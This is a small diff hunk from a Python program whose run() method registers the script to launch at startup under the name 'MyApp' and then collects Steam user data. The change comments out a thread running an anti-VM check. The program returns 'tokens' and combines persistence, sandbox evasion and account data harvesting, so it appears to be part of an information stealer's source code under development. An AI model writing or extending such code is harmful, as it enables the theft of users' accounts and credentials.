@@ -95,7 +95,7 @@ class Main:
         return tokens
 
     def run(self):
-        Thread(target=self.antivm).start()
+        # Thread(target=self.antivm).start()
         self.addStartup("MyApp", os.path.realpath(__file__))
         
         userConfig = self.steam()
